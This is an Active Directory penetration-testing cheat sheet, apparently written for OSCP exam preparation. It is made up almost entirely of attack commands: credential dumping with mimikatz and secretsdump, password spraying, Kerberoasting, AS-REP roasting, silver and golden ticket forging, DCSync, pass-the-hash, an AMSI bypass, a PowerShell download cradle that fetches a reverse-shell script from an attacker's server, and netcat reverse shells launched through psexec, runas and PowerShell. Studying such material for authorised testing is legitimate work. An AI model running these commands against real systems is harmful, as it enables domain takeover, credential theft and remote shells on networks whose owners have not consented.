# IF Stuck, read here
https://github.com/yovelo98/OSCP-Cheatsheet
- MKW → Which is Running Mimikatz + Kerberoasting + Winpeas every time so that I do not miss any juicy vector.

# Enumeration

## Tool 0: Powerview
- guide on how to use Powerview: https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993 
- Quick Commands: [https://github.com/yovelo98/OSCP-Cheatsheet ](https://github.com/yovelo98/OSCP-Cheatsheet?tab=readme-ov-file#using-powerview)

## Tool 1: crackmapexec
- wget https://github.com/byt3bl33d3r/CrackMapExec/releases/download/v5.0.1dev/cme-ubuntu-latest.zip
- **IF smb protocol fails, try winrm protocol**
- enumerate shares (check for READ/WRITE permissions): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-auth --shares`
- enumerate logged on users (check if they are domain admin): `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --loggedon-users`
- RID enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --rid-brute`
- local grp enumeration: `crackmapexec smb 192.168.1.50-192.168.1.55 -u ippsec -p Password12345 --local-groups`
- Get the active sessions: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --sessions`
- Generate a list of relayable hosts (SMB Signing disabled): `crackmapexec smb 192.168.1.0/24 --gen-relay-list output.txt`
- Get the password policy: `crackmapexec smb 192.168.215.104 -u 'user' -p 'PASS' --pass-pol`
- Command execution(e.g. wget,ipconfig, whoami/groups): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'Invoke-WebRequest -Uri "http://192.168.1.223:8000/users.txt"'`
- create new user for persistence(in case ippsec change pw): `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net user /add admin Password12345'`
- add user to localgroup: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -x 'net local group administrators'`
- attempt to authenticate each machine in the subnet with the username and hash provided: `crackmapexec <protocol> <ip>/24 -u <user> -H <hash> --local`
- example: `crackmapexec 192.168.57.0/24 -u "Frank Castle" -H 64f12cddaa88057e06a81b54e73b949b -- local`
- NOTE: #--local: This flag specifies that you're attempting to authenticate against local accounts on the target machine, rather than domain accounts.


## Tool 2:LdapDomainDump
- Download: `git clone https://github.com/dirkjanm/ldapdomaindump`
- got ldap dump: `python3 ldapdomaindump.py --user DOMAIN\\username -p Password12345 ldap://x.x.x.x:389 --no-json --no-grep -o data`
- find Domain admin `DONT_REQ_PREAUTH` -> crack hash offline

## Tool 3:enum4linux
- Built-in in kali linux
- Full target AD info: `enum4linux -u ippsec -p Password12345 -a 192.168.1.50`
- Provides Domain SID, passwords of some users, share enumerations

## Tool 4: evil-winrm
- remote access tool: `evil-winrm -i 192.168.194.165 -u enox -p california`         

# Persistence

## Quick wins
- https://github.com/yovelo98/OSCP-Cheatsheet?tab=readme-ov-file#from-cve-to-system-shell-on-dc 
- Check zerologon: crackmapexec smb 10.10.10.10 -u username -p password -d domain -M zerologon 

## Using crackmapexec
- Reverse shell: [Edit this from Kali to Windows](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcpOneLine.ps1)
- Transfer to windows: `crackmapexec winrm 192.168.1.54 -u ippsec -p Password12345 -X 'iex(New-Object Net.WebClient).DownloadString("http://192.168.223:8000/Invoke-PowerShellTcpOneLine.ps1")'`
- Reverse shell script will autorun upon transfer

# Password-based and Hash-based attack
## Extracting hashes

         SAM - Security Account Manager (Store as user accounts)  %SystemRoot%/system32/config/sam  
         NTDS.DIT (Windows Server / Active Directory - Store AD data including user accounts) %SystemRoot%/ntds/ntds.dit  
         SYSTEM (System file to decrypt SAM/NTDS.DIT)  %SystemRoot%/system32/config/system  
         Backup - Sistemas antigos como XP/2003: C:\Windows\repair\sam and C:\Windows\repair\system

## Extracting Hashes in cache

         fgdump.exe
         /usr/share/windows-binaries/fgdump/fgdump.exe

## Dump the credentials of all connected users, including cached hashes
### Kali Crackmapexec
         sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345
         sudo crackmapexec smb -M mimikatz 192.168.1.54 -u ippsec -Password12345 --server-port 444
         sudo crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --sam
         sudo crackmapexec smb 192.168.1.54 -u ippsec -p Password12345 --lsa
         sudo crackmapexec smb 192.168.1.50 -u jenkinsadmin -H ffffffffffffffffffffffff --ntds
         stored in (for sudo): `cat /root/.cme/logs/Mimikatz-192.168.1.54.log
         stored in (for non-sudo): `cat ~/cme/logs/Mimikatz-192.168.1.54.log
### Kali Impacket
         secretsdump.py -hashes 'LMhash:NThash' 'DOMAIN/USER@TARGET'
         secretsdump.py -hashes ':NThash' 'DOMAIN/USER@TARGET'
         secretsdump.py 'DOMAIN/USER:PASSWORD@TARGET'
         impacket-secretdump exam.com/apachesvc@192.168.1xx.101
         
### Local (privilege::debug, sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here)

         ./mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" > dumped_pwds.txt
         PS C:\users\public > mimikatz.exe "privilege::debug" "lsadump::sam" "exit" > sam.txt
         ./mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "vault::cred /patch" "exit"

## Dumping AD Domain Credentials
Dumping AD Domain Credentials
You will need the following files to extract the ntds :
- NTDS.dit file
- SYSTEM hive (C:\Windows\System32\SYSTEM)
```
cme smb 10.10.0.202 -u username -p password --ntds vss
```


## Cracking AD Hashes

         ntlm:   hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt
         ntlmv2: hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

## Password Spraying

- Spray with Crackmapexec using known password on list of found usernames
```bash
# Crackmapexec uses SMB - check if the output shows 'Pwn3d!' Pwn3d!== that account pawned as admin access!
# protocols = smb, winrm, 
# --continue-on-success to avoid stopping at the first valid credentials.
crackmapexec smb 192.168.50.75 -u users.txt -p 'Nexus123!' -d corp.com --continue-on-success
crackmapexec <protocol> <target(s)> -u username1 -p password1 password2 --no-bruteforce
crackmapexec <protocol> <target(s)> -u username1 username2 -p password1
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -p ~/file_containing_passwords  --continue-on-success 
crackmapexec <protocol> <target(s)> -u ~/file_containing_usernames -H ~/file_containing_ntlm_hashes --continue-on-success
        e.g. crackmapexec smb <IP or subnet> -u users.txt -p 'pass' -d <domain> --continue-on-success #use continue-on-success option if it's subnet
        e.g. crackmapexec smb 192.168.1xx.100 -u users.txt -p 'ESMWaterP1p3S!'
        e.g. crackmapexec 192.168.57.0/24 -u fcastle -d MARVEL.local -p Password1
        users.txt from Get-NetUser
```

- Spray with Kerbrute
- Principle: if username and password is correct, we will obtain a TGT. Kerbrute will test all username and password and return us with success if TGT is obtained with a valid username and password. **Can also just test with username to see if the user is a valid user in the domain.**
```bash
kerbrute passwordspray -d corp.com .\usernames.txt "pass"
kerbrute -domain heist.offsec -users /usr/share/wordlists/names.txt -dc-ip 192.168.194.165
```

- Brute force small number of guess passwords on list of found usernames (tool: Spray-Passwords.ps1) (For LDAP protocol)
  ```bash
  .\Spray-Passwords.ps1
  .\Spray-Passwords.ps1 -Pass Nexus123! -Admin
  ```
  
-   Create Password List  
     `crunchy <length> <length> -t <pw-core>%%%% `
   
-    Spray  
     `rowbar -b rdp -s <ip>\32 -U users.txt -C pw.txt -n 1`


# Ticket and Token based
## Token Impersonation
```
meterpreter load icognito  
list_tokens  
impersonate_token <token>  
```

## Silver Ticket (Forge own TGS service ticket)
- Precondition1: Privileged Account Certificate (PAC) validation **not enabled**
- Precondition2: obtain that service account's password hash (via Kerberoasting or other means), it could then forge a TGS for that SPN and access the service that utilizes it
- Principle: the application blindly trusts the integrity of the service ticket since it is encrypted with a password hash that is, in theory, only known to the service account and the domain controller.
- Get SID of your current box
```
GetDomainsid (PowerView)
```
or  
```
whoami /user
```
- Get Machine Account Hash (e.g. username: iis_service)
```
privilege::debug
sekurlsa::logonpasswords
```
or
```
Invoke-Mimikatz '"lsadump::lsa /patch"' -ComputerName <hostname_dc>
```

Complete steps
```bash
#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session using /ptt
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user/existing domain user> /ptt
      kerberos: :golden /user:offsec /domain:corp.com /sid: S-1-5-21-4038953314-3014849035-**1274281563** /target:CorpSqlServer.corp.com:1433 /service:MSSQLSvc /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
      kerberos::golden /sid:S-1-5-21-1987370270-658905905-**1781884369** /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin

#using NTLM generate the Silver Ticket (TGS) and inject it into memory for current session and output to ticket.kirbi using /ticket flag
kerberos::golden /sid:<domainSID> /domain:<domain-name> /ptt /target:<targetsystem.domain> /service:<service-name> /rc4:<NTLM-hash> /user:<new-user> /ticket

#using aeskey generate the Silver Ticket (TGS) and inject it into memory
kerberos::golden /domain:$DOMAIN/sid:$DOMAIN_SID /aes128:$KRBTGT_AES_128_KEY /user:$DOMAIN_USER /service:$SERVICE_SPN /target:$SERVICE_MACHINE_HOSTNAME

# Checking if the forged tickets is in memory
ps> klist

# verify access to targeted SPN (http://web04 is the HTTP SPN mapped to iis_service)
iwr -UseDefaultCredentials http://web04

# Inject the ticket (not needed if the TGS is already loaded in current session)
mimikatz.exe "kerberos::ptt <TICKET_FILE>"
.\Rubeus.exe ptt /ticket:<TICKET_FILE>
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

# Obtain a shell
cmd> psexec.exe -accepteula \\<remote_hostname> cmd   # psexec
cmd> sqlcmd.exe -S [service_hostname]                 # if service is MSSQL

```

## AS-REP roasting
### on Kali
- condition: cannot identify any AD users with the account option "Do not require Kerberos preauthentication" enabled 
- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes

kerbrute - Enumeration Users (use with Preauth not required
```
kerbrute userenum -d test.local --dc <dc_ip> userlist.txt
OR
Get-DomainUser -PreauthNotRequired -Verbose
OR
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```
https://raw.githubusercontent.com/Sq00ky/attacktive-directory-tools/master/userlist.txt

GetNPUsers.py - Query/find ASReproastable accounts from the KDC
```
impacket-GetNPUsers domain.local/ -dc-ip <IP> -usersfile userlist.txt
```
or
```
impacket-GetNPUsers -dc-ip 192.168.50.70 -request -outputfile hashes.asreproast corp.com/user1
```

Get plaintext password of user who "Do not require Kerberos preauthentication" using hashcat with option 18200 for AS-REP
```
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r usr/share/hashcat/rules/best64.rule --force
```

### on windows (use Rubeus)
```powershell
#extract AS-REP hash
.\Rubeus.exe asreproast /nowrap

#copy to kali to run hash cat
sudo hashcat -m 18200 hashes.asreproast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

## Targeted AS-REP roasting
### on Kali
- condition: **cannot identify** any AD users with the account option "Do not require Kerberos preauthentication" enabled && notice that we have GenericWrite or GenericAll permissions on another AD user account
- leveraging "GenericWrite or GenericAll" permissions, we can modify the User Account Control value of *any* user to not require Kerberos preauthentication
- Once enabled "Do not require Kerberos preauthentication" of the user, do AS-REP roasting without using previously found password, then **obtain their password** thru AS-REP hashes
- Finally, reset the User Account Control value of the user once we’ve obtained the AS-REP hash

## Kerberoast  [STEAL ticket]
<aside>
https://github.com/skelsec/kerberoast
Kerberoasting is a technique that allows an attacker to steal the KRB_TGS ticket, that is encrypted with RC4, to brute force application services hash to extract its password. 
Kerberoasting requires a valid domain account.
Three step process:
- Find SPN tied to user accounts through LDAP (service accounts)
- Request a TGS for a specific SPN
- Crack the TGS offline to recover the service account's password
</aside>

### On Kali
- impacket-GetUserSPNs
```
impacket-GetUserSPNs <domain>/<user>:<password>// -dc-ip <IP> -request
```
or  
```
GetUserSPNs.py -request -dc-ip <RHOST> <domain>/<user>
```
or
```
impacket-GetUserSPNs -request -dc-ip 192.168.50.70 corp.com/pete
```
or
```
impacket-GetUserSPNs -request -dc-ip <IP> -hashes <hash_machine_account>:<hash_machine_account> <domain>/<machine_name$> -outputfile hashes.kerberoast
```
or
```
Invoke-Kerberoast -OutputFormat Hashcat | Select-Object Hash | Out-File -filepath 'c:\temp\hashcapture.txt' -width 8000
```

```
hashcat -a 0 -m 13100 ok.txt /usr/share/wordlists/rockyou.txt
hashcat -m 13100 hashes.kerberoast2 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```
```
.\PsExec.exe -u <domain>\<user> -p <password> cmd.exe
```
or  
```
runas /user:<hostname>\<user> cmd.exe
```

### On Windows
- Method 1 (Reubeus)
```bash
#automatically find kerberoastable users in targeted Domain and transfer the output hash to kali
.\Rubeus.exe kerberoast /outfile:hashes.kerberoast

#on kali, see hash contain to identify the hash type
cat hashes.kerberoast

#find the corresponding hash type number in hashcat
hashcat --help | grep -i "Kerberos"

#crack hash using hashcat 13100, TGS-REP, output is plaintext password of kerberoastable account
sudo hashcat -m 13100 hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
```

- Method 2
```bash
powershell -ep bypass -c "IEX (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1') ; Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash | out-file -Encoding ASCII kerb-Hash0.txt"

# cracking TGS hashes
hashcat -m 13100 kerb-Hash0.txt wordlist.txt --force
OR
hashcat64.exe -m 13100 "C:\Users\test\Documents\Kerb1.txt" C:\Users\test\Documents\Wordlists\Rocktastic12a --outfile="C:\Users\test\Documents\CrackedKerb1.txt"
```

- Method 3
```bash
#get SPN that you want to target
impacket-GetUserSPNs exam.com/apachesvc -dc-ip 172.16.1xx.100

#requesting TGS ticket, i.e. .kirbi
PS C:\Users\offsec> Add-Type -AssemblyName System. IdentityModel
PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'SPN'
        PS C:\Users\offsec> New-Object System. IdentityModel. Tokens. KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com'
mimikatz # kerberos :: list /export

#crack hash using tgsrepcrack.py
/usr/share/kerberoast/tgsrepcrack.py wordlist.txt 2-40a50000-offsec@HTTP\~CorpWebServer.corp.com-CORP.COM.kirbi
#crack hash using kirbi2john.py
python3 kirbi2john.py /root/pen200/exercise/ad/sgl.kirbi
```

## Targeted Kerberoasting
### on Kali
- condition: we have GenericWrite or GenericAll permissions on another AD user account
- leveraging "GenericWrite or GenericAll" permissions, (1) reset the user's password but this may raise suspicion. or (2) set an SPN for the user.
- kerberoast the account **(same as normal kerberoast)**
- crack the password hash **(same as normal kerberoast)**

## DCSync Attack
- The DCSync attack consists of requesting a replication update with a domain controller and obtaining the password hashes of each account in Active Directory without ever logging into the domain controller.
```
./mimikatz.exe "lsadump::dcsync /user:Administrator"
```

# Lateral movement - try to use PsExec instead of CME as the remote shell will be more persistent
## Tool 1: PsExec (The tool for RCE, provide remote execution of processes on other systems through an interactive console.

Precondition:
- First, the user that authenticates to the target machine needs to be part of the Administrators local group - usually default
- Second, the ADMIN$ share must be available - usually default
- third, File and Printer Sharing has to be turned on. 

```bash
./PsExec64.exe -i  \\FILES04 -u corp\jen -p Nexus123! cmd
```

## PASS THE Password and see what other accounts can the password access

         crackmapexec <ip>/24 -u <user> -d <DOMAIN> -p <password>    
         crackmapexec <ip>/24 -u fcastle -d MARVEL.local -p <password>    

- Remote Access - impacket-psexec  
```
psexec.py marvel/fcastle:Password1@192.168.57.142 
```
        
## Pass the Hash (Path storing hashes: `~/.cme/logs`. 3 types of files: .sam, .secrets, .cached)
- Allows an attacker to authenticate to a remote system or service via a user's NTLM hash
Precondition (3 conditions):
- requires an SMB connection through the firewall (commonly port 445)
- the Windows File and Printer Sharing feature to be enabled.
- admin share called ADMIN$ to be available.

- using wmiexec on kali
  
         kali@kali:~$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.50.73
  
- Remote Access + evil-winrm  

         evil-winrm -i <IP> -u <user> -H <hash>
  
- Remote Access - impacket-psexec  
```
impacket-psexec '<domain>/<user>'@<IP> -hashes ':<hash>'
psexec.py "frank castle":@192.168.57.141 -hashes aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b 
```

- Remote Access - CrackMapExec (to run commands as another user using PTH)
```
crackmapexec winrm 192.168.1.50 -u s4vitar -H ffffffffffffffffffffffff -X 'whoami'
crackmapexec smb 192.168.1.54 -u jenkinsadmin -H ffffffffffffffffffffffff -X 'whoami'
```

- Remote Access - winexe
```
pth-winexe -U Administrator%aad3b435b51404eeaad3b435b51404ee:<hash_ntlm> //<IP> cmd.exe
```


## Over Pass the Hash (exploit user hash and make a TGT)
Allows an attacker to abuse an NTLM user hash to obtain a full Kerberos ticket granting ticket (TGT) or service ticket (TGS), which grants us access to another machine or service as that user

- obtain NTLM hash of current user in current context e.g. running notepad as Jen
```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

- Create new PowerShell as Jen (hash owner) to obtain Kerberos tickets without performing NTLM authentication over the network (output: launch a new powershell as Jen
```
mimikatz # sekurlsa::pth /user:jen /domain:corp.com /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell
```

- if klist finds no cached TGT and TGS, we generate TGT using cache hashes by invoking
```
net use \\files04
```

- Once klist returns a krbtgt, then the NTLM has been converted into kerberos TGT
```
.\PsExec.exe \\<hostname> cmd.exe
.\PsExec.exe \\files04 cmd
```

## Pass the Ticket (extract Dave WEB-04 TGS from memory into our own session)
- Export Cache TGT/TGS to disk
```
privilege::debug
sekurlsa::tickets /export
```
- View exported TGT/TGS
```
dir *.kirbi
```
- Pick any TGS ticket in the dave@cifs-web04.kirbi format and inject it through mimikatz via the kerberos::ptt command.
```
kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi
```
- inspect loaded ticket in memory
```
klist
```
- once verified that Dave ticket is loaded in memory, we go to our powershell and access Web04
```
ls \\web04\backup
```

## DCOM (SKIPPED)

# Persistence 

## Golden Ticket - Pass the Ticket (get our hands on the krbtgt password hash and we could create our own self-made custom TGTs, also known as golden tickets)
outcome: The permission of the user whom we used the krbtgt password hash **will be inherited ** to the current user who we used for lateral movement
Condition: we first either have access to a **Domain Admin's group account** or to have **compromised the domain controller** itself to work

- Get the NTLM hash of the krbtgt account (i.e. **Domain Admin's group account**), along with the domain SID
```
./mimikatz.exe privilege::debug
./mimikatz.exe lsadump::lsa /patch
```
- Get domain SID
```
GetDomainsid (PowerView)
```

- delete any existing Kerberos tickets
```
./mimikatz.exe kerberos::purge
```
 
- Creating a golden ticket using Mimikatz, so that user jen will be part of the Domain Admin group.
```
mimikatz.exe kerberos::golden /user:jen /domain:corp.com /sid:S-1-5-21-1987370270-658905905-1781884369 /krbtgt:1693c6cefafffc7af11ef34d1c788f47 /ptt
Invoke-Mimikatz -Command '"kerberos::golden /User:Administrator /domain:corporate.corp.local /sid:S-1-5-21-1324567831-1543786197-145643786 /krbtgt:0c88028bf3aa6a6a143ed846f2be1ea4 id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'
```

- With the golden ticket injected into memory, let's use PsExec_ to launch a new command prompt
```
"misc::cmd"
```

- Run command prompt to access DC01 and X.70
```
psexec.exe \\dc1 cmd.exe
psexec.exe \\192.168.50.70 cmd.exe
```

## Shadow Copies (skipped)
https://anishmi123.gitbooks.io/oscp-my-journey/content/active-directory/ad-attacks.html 


# Tools Introduction
-   Windows Run As - Switching users in linux is trival with the `SU` command.  However, an equivalent command does not exist in Windows.  Here are 3 ways to run a command as a different user in Windows.

      -   Sysinternals psexec is a handy tool for running a command on a remote or local server as a specific user, given you have thier username and password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Psexec (on a 64 bit system).

               C:\>psexec64 \\COMPUTERNAME -u Test -p test -h "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe" 

               PsExec v2.2 - Execute processes remotely
               Copyright (C) 2001-2016 Mark Russinovich
               Sysinternals - www.sysinternals.com

      -   Runas.exe is a handy windows tool that allows you to run a program as another user so long as you know thier password. The following example creates a reverse shell from a windows server to our Kali box using netcat for Windows and Runas.exe:

               C:\>C:\Windows\System32\runas.exe /env /noprofile /user:Test "c:\users\public\nc.exe -nc 192.168.1.10 4444 -e cmd.exe"
               Enter the password for Test:
               Attempting to start nc.exe as user "COMPUTERNAME\Test" ...

      -   PowerShell can also be used to launch a process as another user. The following simple powershell script will run a reverse shell as the specified username and password.

               $username = '<username here>'
               $password = '<password here>'
               $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
               $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
               Start-Process -FilePath C:\Users\Public\nc.exe -NoNewWindow -Credential $credential -ArgumentList ("-nc","192.168.1.10","4444","-e","cmd.exe") -WorkingDirectory C:\Users\Public

             Next run this script using powershell.exe:

             `powershell -ExecutionPolicy ByPass -command "& { . C:\Users\public\PowerShellRunAs.ps1; }"`

## DCSync-Domain Controller Synchronization
- Condition:  User needs to have the Replicating Directory Changes, Replicating Directory Changes All, and Replicating Directory Changes in Filtered Set rights. *By default, members of the Domain Admins, Enterprise Admins, and Administrators groups have these rights*
- Hence, must have access to members of the Domain Admins, Enterprise Admins, and Administrators groups
- Target of your victim must be known or can be administrator

### DCSync On windows
```powershell
#Assuming we have access to a domain joined machine, we launch mimikatz
#output of lsadump::dcsync is NTLM hash of target user including Administrator
mimikatz # lsadump::dcsync /user:corp\*targetusertoobtaincredential*
Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\krbtgt"'
```

### DCSync on Kali
```bash
#192.168.50.70 = IP of Domain Controller, output is the hash of target user
impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
```

### use hashcat to decrypt hash
`hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force`


# Active Directory Pentesting

### crackmapexec's lsassy
- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345`
- `sudo crackmapexec smb -M lsassy 192.168.1.54 -u ippsec -Password12345 --server-port 444`
- does not store logs locally

### Powerview

```bash
powershell -ep bypass  
Import-Module .\PowerView.ps1 #loading module to powershell, if it gives error then change execution policy
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetUser -SPN | select samaccountname,serviceprincipalname # Listing SPN accounts in domain
Get-UserProperty -Properties badpwdcount
Find-UserField -SearchField Description -SearchTerm "pass"          #search description field for the word "pass"
Invoke-UserHunter -CheckAccess   # check for the Local Administrator Access of that particular user 
Get-NetGroupMember -GroupName "Domain Admins"       #get SID, Group Doamin name, group name
Get-NetGroup | select cn    #user list for password attacks
Get-NetGroup *admin*       # enumerate domain groups
Get-NetSession -ComputerName files04 -Verbose #Checking logged on users with Get-NetSession, adding verbosity gives more info.
Get-DomainUser -PreauthNotRequired -verbose # identifying AS-REP roastable accounts
Get-NetUser -SPN | select serviceprincipalname #Kerberoastable accounts
Get-NetGroupMember -GroupName "Domain Admins"
Get-NetComputer | select dnshostname,operatingsystem,operatingsystemversion #attack old OS and see which are web server or file server
Find-LocalAdminAccess #  determine if our current user has administrative permissions on any computers in the domain
Get-ObjectAcl -Identity <user> # enumerates ACE(access control entities), lists SID(security identifier). ObjectSID
Convert-SidToName <sid/objsid> # converting SID/ObjSID to name
Get-NetDomain #basic information about the domain

Get-NetSession -ComputerName *client74*
Get-ObjectAcl -Identity *stephanie* #see ObjectSID, ActiveDirectoryRights, SecurityIdentifier (securityidentifier has certain rights on objectSID)
Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Invoke-EnumerateLocalAdmin      #searched for the Local Administrators for the domain
Invoke-UserHunter
Invoke-Portscan -Hosts sql01
Invoke-ShareFinder      #find non system shares 
Invoke-FileFinder       #find possible password file
Invoke-ACLScanner -ResolveGUIDs        #check ACL

# Checking for "GenericAll" right for a specific group, after obtaining they can be converted using convert-sidtoname
"S-1-5-21-1987370270-658905905-1781884369-512","S-1-5-21-1987370270-658905905-1781884369-1104" | Convert-SidToName #method 1
Convert-SidToName *S-1-5-21-1987370270-658905905-1781884369-1104*  #method 2
Find-DomainShare #find the shares in the domain. ##TIPS: ls all the NAME (folder) found in Find-DomainShare
- ls \\*FILES04*\*docshare*   #name=docshare, computername=FILES04.corp.com
- ls \\*dc1.corp.com*\sysvol\*corp.com*\ # %SystemRoot%\SYSVOL\Sysvol\domainname on the domain controller and every domain user has access to it.
gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE" #decrypt cpassword in Group Policy Preferences (GPP) in kali
```

### Bloodhound (Install before exam, snapshot VM before installing)
- https://github.com/fox-it/BloodHound.py
- sometimes bloodhound may not see everything (e.g. DACL permissions) that can be seen with PowerView. 
```bash
# Sharphound - transfer sharphound.ps1 into the compromised machine
powershell -ep bypass  
Import-Module .\Sharphound.ps1 
Invoke-BloodHound -CollectionMethod All -OutputDirectory <location> -OutputPrefix "name" # collects and saved with the specified details, output will be saved in windows compromised machine
      e.g. Invoke-BloodHound -CollectionMethod All -Domain MARVEL.local -ZipFileName file.zip

# Download zip onto kali, import into bloodhound  
```bash
sudo neo4j console
# then upload the .json files obtained

sudo bloodhound
# then upload the .zip files obtained
```

## EvilWinRM (install before exam, do a snapshot before installing)
- Gives persistent shell. Crackmapexec doesnt.
- Installation: `gem install evil-winrm`
- Get powershell access using: `evil-winrm  -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!'`
- to see what command you can run: `menu`

```bash
#run scripts stored in kali's /opt/privsc/powershell directory, from evil-winrm
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -s /opt/privsc/powershell
Bypass-4MSI
Invoke-Mimikatz.ps1
Invoke-Mimikatz

#run winPEAS
evil-winrm -i 192.168.1.19 -u administrator -p Ignite@987 -e /opt/privsc
Bypass-4MSI
menu
Invoke-Binary /opt/privsc/winPEASx64.exe
```
- Send file from kali to window(on kali running PS): `upload <kali directory and filename> <windows destination directory and filename>`
- Send file from kali (python http server) to windows (on kali running PS): `iex(new-object net.webclient).downloadstring('kali address:port/file')`
- Send file from window to kali(on kali running PS) : `download <windows destination directory and filename> <kali directory and filename>`

## PSexec (lateral movement)

```powershell
#FILE04 = target host, jen = user with access to FILES04
./PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd
```

### Silver Tickets (Forge ticket)
- 3 ingredients: SPN password hash (of user account with access to Target SPN resource), Domain SID, Target SPN

-Silver Ticket Default Groups:
<aside>
Domain Users SID: S-1-5-21<DOMAINID>-513
Domain Admins SID: S-1-5-21<DOMAINID>-512
Schema Admins SID: S-1-5-21<DOMAINID>-518
Enterprise Admins SID: S-1-5-21<DOMAINID>-519
Group Policy Creator Owners SID: S-1-5-21<DOMAINID>-520
</aside>

- In Windows, Mimikatz can be used to craft the ticket. Next, the ticket is injected with Rubeus, and finally a remote shell can be obtained thanks to PsExec.
  
- Obtaining hash of an SPN user using **Mimikatz** (Tool: mimikatz)
```powershell
privilege::debug
sekurlsa::logonpasswords #obtain NTLM hash of the SPN account here
```

- Obtaining Domain SID
```powershell
ps> whoami /user
# this gives SID of the user that we're logged in as. If the user SID is "S-1-5-21-1987370270-658905905-1781884369-1105" then the domain SID is "S-1-5-21-1987370270-658905905-1781884369" i.e. omit RID of "1105"
```

### Golden Ticket Ft **Mimikatz** (Forge ticket)
<aside>
Forging a TGT (and the included PAC)
Requires tje krbtgt key, the “master” encryption key from the KDC
Can be used to request any TGS from the Domain Controller
</aside>

```bash
#getting krbtgt (user: krbtgt, NTLM: krbtgt hash)
mimikatz # privilege::debug
mimikatz # lsadump::lsa /patch

#using krbtgt hash via mimikatz
kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
        mimikatz # kerberos :: golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-4038953314-3014849035-1274281563 /krbtgt:fc274a94b36874d2560a7bd332604fab /ptt
# Example using aes key
kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /aes256:430b2fdb13cc820d73ecf123dddd4c9d76425d4c2156b89ac551efb9d591a439 /ticket:golden.kirbi

 #List tickets in memory
klist

#using krbtgt hash via Rubeus
.\Rubeus.exe ptt /ticket:ticket.kirbi
        .\Rubeus.exe ptt /ticket:C:\Temp\silver.kirbi

#After running above code to generate golden ticket, the golden ticket will be automaticallys submiited for current session
#to launch cmd using the current session validated by golden ticket
mimikatz # misc::cmd
mimikatz # misc::cmd whoami
```

### Targeted Kerberoasting
- Condition: have GenericWrite or GenericAll permissions on another AD user account
- then, purposely set SPN for the targeted user
- then kerberoast the account
- then crack the hash using hashcat to get the clear password
- after attack, REMEMBER to delete the SPN


## Metasploit (msf6)
- start: `msfconsole`
- search for modules: `search ms17`
